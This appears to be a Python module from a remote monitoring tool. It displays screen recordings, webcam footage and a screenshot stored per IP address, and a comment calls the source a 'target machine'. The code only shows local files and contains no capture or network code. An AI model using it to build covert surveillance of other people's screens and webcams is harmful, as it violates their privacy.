import cv2 , pyautogui , os 


# to display recording
def show_video(filepath,ip):
    vid=cv2.VideoCapture(filepath)
    window_name=""
    SCREEN_SIZE=None
    if filepath == os.path.join(ip,'screen.avi'):
        window_name="LiveScreen"
        SCREEN_SIZE=pyautogui.size()
    elif filepath == os.path.join(ip,"webcam2.avi"):
        window_name="WebcamFeed"
        vid2=cv2.VideoCapture(0,cv2.CAP_DSHOW)
        width = int(vid2.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(vid2.get(cv2.CAP_PROP_FRAME_HEIGHT))
        SCREEN_SIZE=(width,height)
        vid2.release()
    cv2.namedWindow(window_name,cv2.WINDOW_NORMAL)
    cv2.resizeWindow(window_name,SCREEN_SIZE[0],SCREEN_SIZE[1])
    while vid.isOpened():
        ret,frame=vid.read()
        if ret == True:
            cv2.imshow(window_name,frame)
            cv2.waitKey(25)
        else:
            break

    vid.release()
    cv2.destroyAllWindows()


# to display screenshot of target machine
def show_image(ip):
    im=cv2.imread(os.path.join(ip,'ss.jpg'))
    SCREEN_SIZE=pyautogui.size()
    cv2.namedWindow("Screenshot",cv2.WINDOW_NORMAL)
    cv2.resizeWindow("Screenshot",SCREEN_SIZE[0],SCREEN_SIZE[1])
    cv2.imshow("Screenshot",im)
    cv2.waitKey(3000)
    cv2.destroyAllWindows()
